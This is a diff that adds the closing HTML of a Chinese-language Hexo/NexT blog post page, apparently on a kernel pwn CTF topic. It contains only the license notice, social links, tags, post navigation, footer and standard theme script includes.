+      <strong>版权声明： </strong>本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh" rel="noopener" target="_blank"><i class="fab fa-fw fa-creative-commons"></i>BY-NC-SA</a> 许可协议。转载请注明出处！
+  </li>
+</ul>
+</div>
+
+          <div class="followme">
+  <span>欢迎关注我的其它发布渠道</span>
+
+  <div class="social-list">
+
+      <div class="social-item">
+          <a target="_blank" class="social-link" href="https://twitter.com/RoarCantProgram">
+            <span class="icon">
+              <i class="fab fa-twitter"></i>
+            </span>
+
+            <span class="label">Twitter</span>
+          </a>
+      </div>
+
+      <div class="social-item">
+          <a target="_blank" class="social-link" href="https://t.me/Y3dramJzZw">
+            <span class="icon">
+              <i class="fab fa-telegram"></i>
+            </span>
+
+            <span class="label">Telegram</span>
+          </a>
+      </div>
+
+      <div class="social-item">
+          <a target="_blank" class="social-link" href="/atom.xml">
+            <span class="icon">
+              <i class="fa fa-rss"></i>
+            </span>
+
+            <span class="label">RSS</span>
+          </a>
+      </div>
+  </div>
+</div>
+
+          <div class="post-tags">
+              <a href="/tags/ctf/" rel="tag"><i class="fa fa-tag"></i> ctf</a>
+              <a href="/tags/pwn/" rel="tag"><i class="fa fa-tag"></i> pwn</a>
+              <a href="/tags/kernel/" rel="tag"><i class="fa fa-tag"></i> kernel</a>
+          </div>
+
+        
+
+          <div class="post-nav">
+            <div class="post-nav-item">
+                <a href="/2020/11/09/differential-attack-in-a-toy-algorithm/" rel="prev" title="一个玩具算法的差分攻击">
+                  <i class="fa fa-angle-left"></i> 一个玩具算法的差分攻击
+                </a>
+            </div>
+            <div class="post-nav-item">
+                <a href="/2021/03/10/Linux-kernel-vmware/" rel="next" title="Linux kernel 双机调试">
+                  Linux kernel 双机调试 <i class="fa fa-angle-right"></i>
+                </a>
+            </div>
+          </div>
+    </footer>
+  </article>
+</div>
+
+
+
+
+
+
+</div>
+  </main>
+
+  <footer class="footer">
+    <div class="footer-inner">
+
+  <div class="copyright">
+    &copy; 
+    <span itemprop="copyrightYear">2024</span>
+    <span class="with-love">
+      <i class="fa fa-heart"></i>
+    </span>
+    <span class="author" itemprop="copyrightHolder">V1me</span>
+  </div>
+
+    </div>
+  </footer>
+
+  
+  <div class="toggle sidebar-toggle" role="button">
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+  </div>
+  <div class="sidebar-dimmer"></div>
+  <div class="back-to-top" role="button" aria-label="返回顶部">
+    <i class="fa fa-arrow-up fa-lg"></i>
+    <span>0%</span>
+  </div>
+
+  <a href="https://github.com/Roarcannotprogramming" class="github-corner" title="在 GitHub 上关注我" aria-label="在 GitHub 上关注我" rel="noopener" target="_blank"><svg width="80" height="80" viewBox="0 0 250 250" aria-hidden="true"><path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"></path><path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2" fill="currentColor" style="transform-origin: 130px 106px;" class="octo-arm"></path><path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z" fill="currentColor" class="octo-body"></path></svg></a>
+
+<noscript>
+  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
+</noscript>
+
+
+  
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/animejs/3.2.1/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous"></script>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/next-theme-pjax/0.6.0/pjax.min.js" integrity="sha256-vxLn1tSKWD4dqbMRyv940UYw4sXgMtYcK6reefzZrao=" crossorigin="anonymous"></script>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/fancyapps-ui/5.0.33/fancybox/fancybox.umd.js" integrity="sha256-+2+qOqR8CKoHh/AsVR9k2qaDBKWjYNC2nozhYmv5j9k=" crossorigin="anonymous"></script>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/lozad.js/1.16.0/lozad.min.js" integrity="sha256-mOFREFhqmHeQbXpK2lp4nA3qooVgACfh88fpJftLBbc=" crossorigin="anonymous"></script>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/pangu/4.0.7/pangu.min.js" integrity="sha256-j+yj56cdEY2CwkVtGyz18fNybFGpMGJ8JxG3GSyO2+I=" crossorigin="anonymous"></script>
+<script src="/js/comments.js"></script><script src="/js/utils.js"></script><script src="/js/motion.js"></script><script src="/js/schemes/muse.js"></script><script src="/js/next-boot.js"></script><script src="/js/pjax.js"></script>
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/hexo-generator-searchdb/1.4.1/search.js" integrity="sha256-1kfA5uHPf65M5cphT2dvymhkuyHPQp5A53EGZOnOLmc=" crossorigin="anonymous"></script>
+<script src="/js/third-party/search/local-search.js"></script>
+
+
+
+
+  <script src="/js/third-party/fancybox.js"></script>
+
+
+
+  
+
+
+
+
+  
+
+  <script class="next-config" data-name="enableMath" type="application/json">false</script><script class="next-config" data-name="mathjax" type="application/json">{"enable":true,"tags":"none","js":{"url":"https://cdnjs.cloudflare.com/ajax/libs/mathjax/3.2.2/es5/tex-mml-chtml.js","integrity":"sha256-MASABpB4tYktI2Oitl4t+78w/lyA+D7b/s9GEP0JOGI="}}</script>
+<script src="/js/third-party/math/mathjax.js"></script>
+
+
+
+</body>
+</html>
